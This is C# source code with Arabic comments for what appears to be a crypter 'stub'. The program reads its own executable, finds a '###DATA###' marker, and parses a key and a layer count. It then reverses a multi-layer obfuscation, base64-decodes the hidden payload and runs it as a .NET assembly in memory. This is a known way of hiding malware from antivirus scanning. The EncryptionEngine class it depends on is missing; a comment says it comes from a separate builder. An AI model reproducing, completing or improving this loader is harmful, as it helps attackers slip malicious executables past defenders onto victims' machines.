using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Linq;
using System.Windows.Forms;
using System.Diagnostics;

namespace Stub
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            try
            {
                // 1. الحصول على مسار الملف الحالي
                string selfPath = Process.GetCurrentProcess().MainModule.FileName;
                byte[] allBytes = File.ReadAllBytes(selfPath);
                byte[] marker = Encoding.UTF8.GetBytes("###DATA###");

                // 2. البحث عن مكان البيانات
                int index = FindBytes(allBytes, marker);
                if (index == -1) throw new Exception("Data marker not found!");

                // 3. استخراج البيانات بعد العلامة
                byte[] afterMarker = allBytes.Skip(index + marker.Length).ToArray();

                // 4. استخراج الإعدادات (حتى نصل للفاصل 0xFF)
                int separatorIndex = Array.IndexOf(afterMarker, (byte)0xFF);
                if (separatorIndex == -1) throw new Exception("Config separator not found!");

                string config = Encoding.UTF8.GetString(afterMarker.Take(separatorIndex).ToArray());
                string[] configParts = config.Split('|');

                // قراءة الإعدادات (المفتاح | الطبقات | هل تم استخدام مفتاح؟)
                string key = configParts.Length > 0 ? configParts[0] : "NO_KEY";
                int layers = configParts.Length > 1 ? int.Parse(configParts[1]) : 1;
                bool useKey = configParts.Length > 2 ? bool.Parse(configParts[2]) : false;

                // 5. استخراج البيانات المشفرة (ما بعد الـ 0xFF)
                string encryptedData = Encoding.UTF8.GetString(afterMarker.Skip(separatorIndex + 1).ToArray());

                // 6. فك التشفير
                EncryptionEngine engine = new EncryptionEngine();
                string result = encryptedData;

                for (int i = 0; i < layers; i++)
                {
                    result = engine.ReverseString(result);
                    if (useKey) result = engine.ShuffleByPassword(result, key, true);
                    result = engine.Process(result, false);
                }

                // 7. التشغيل في الذاكرة
                byte[] exeBytes = Convert.FromBase64String(result);
                Assembly assembly = Assembly.Load(exeBytes);

                MethodInfo method = assembly.EntryPoint;
                object[] parameters = method.GetParameters().Length == 0 ? null : new object[] { new string[0] };

                // تغيير المسار للمسار المؤقت لضمان عمل الملفات التي تحتاج لملفات خارجية
                Directory.SetCurrentDirectory(Path.GetTempPath());

                method.Invoke(null, parameters);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Stub Error: " + ex.Message);
            }
        }

        static int FindBytes(byte[] src, byte[] pattern)
        {
            for (int i = 0; i < src.Length - pattern.Length; i++)
            {
                if (src.Skip(i).Take(pattern.Length).SequenceEqual(pattern)) return i;
            }
            return -1;
        }

    }

    // تأكد أن EncryptionEngine موجود هنا بنفس كود Builder
    // (يجب أن يحتوي على الدوال: Process, ReverseString, ShuffleByPassword)
}